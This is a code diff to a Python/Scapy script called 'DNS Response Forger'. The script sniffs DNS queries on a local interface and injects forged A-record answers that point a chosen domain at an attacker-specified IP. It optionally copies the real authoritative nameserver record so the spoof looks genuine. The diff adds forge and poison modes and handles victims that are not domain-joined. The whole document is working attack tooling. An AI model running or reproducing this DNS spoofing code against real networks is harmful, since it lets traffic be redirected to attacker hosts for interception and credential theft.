@@ -7,8 +7,9 @@ authoritative_nameservers = []
 def get_ns(packet):
     global authoritative_nameservers
     if packet.haslayer(DNS) and DNSRR in packet:
-        print("[+] Captured Authoritative Nameserver Signature")
-        authoritative_nameservers = packet[DNS].ns
+        if packet[DNS].ns:
+            authoritative_nameservers = packet[DNS].ns
+            print("[+] Captured Authoritative Nameserver Signature")
 
 
 def dns_forge(packet):
@@ -26,7 +27,7 @@ def dns_forge(packet):
             return
         else:
             print(f"[+] Poisoning query: {query}")
-    except:
+    except Exception:
         print("[-] Error")
 
     response_packet = Ether(
@@ -46,16 +47,20 @@ def dns_forge(packet):
         qr=1,
         qdcount=1,
         ancount=1,
-        nscount=1,
+        nscount=0,
         arcount=0,
         an=DNSRR(
             rrname=packet[DNS].qd.qname,
             type='A',
             ttl=600,
             rdata=args.poison_ip
-            ),
-        ns=authoritative_nameservers[0]
+            )
         )
+    
+    # Modify packet if victim domain-joined
+    if authoritative_nameservers:
+        response_packet[DNS].nscount=1
+        response_packet[DNS].ns = authoritative_nameservers[0]
 
     # Send the DNS response
     sendp(response_packet, iface=net_interface, verbose=0)
@@ -67,23 +72,29 @@ def parse_args():
     parser = argparse.ArgumentParser(
         description="DNS Response Forger",
     )
-    parser.add_argument('--interface',
-                        '-i',
+    parser.add_argument('-m',
+                        '--mode',
+                        type=str,
+                        help="Operation mode",
+                        choices=['forge', 'poison'],
+                        required=True)
+    parser.add_argument('-i',
+                        '--interface',
                         type=str,
                         help="Interface to sniff/poison on",
                         required=True)
-    parser.add_argument('--dns-server',
-                        '-d',
+    parser.add_argument('-d',
+                        '--dns-server',
                         type=str,
                         help="IP address of Authoritative DNS Server",
                         required=True)
-    parser.add_argument('--query-name',
-                        '-qn',
+    parser.add_argument('-qn',
+                        '--query-name',
                         type=str,
                         help="DNS Query Name to Poison",
                         required=True)
-    parser.add_argument('--poison-ip',
-                        '-p',
+    parser.add_argument('-p',
+                        '--poison-ip',
                         type=str,
                         help="IP address of to poison with",
                         required=True)
@@ -98,20 +109,21 @@ def main():
     args = parse_args()
 
     net_interface = args.interface
-
-    ns_resp_packet_filter = " and ".join([
-        "udp src port 53",
-        f"src host {args.dns_server}"
-        ])
-    print("[!] Capturing Authoritative Nameserver Signature....")
-    while not authoritative_nameservers:
-        sniff(filter=ns_resp_packet_filter, prn=get_ns, store=0, iface=net_interface, count=1)
+    
+    if args.mode == 'forge':
+        ns_resp_packet_filter = " and ".join([
+            "udp src port 53",
+            f"src host {args.dns_server}"
+            ])
+        print("[!] Capturing Authoritative Nameserver Signature....")
+        while not authoritative_nameservers:
+            sniff(filter=ns_resp_packet_filter, prn=get_ns, store=0, iface=net_interface, count=1)
 
     dns_req_packet_filter = " and ".join([
         "udp dst port 53",
         "udp[10] & 0x80 = 0"
         ])
-    print(f"[!] Forging DNS responses for {args.query_name}")
+    print(f"[!] Forging/Poisoning DNS responses for {args.query_name}")
     sniff(filter=dns_req_packet_filter, prn=dns_forge, store=0, iface=net_interface)
 
 
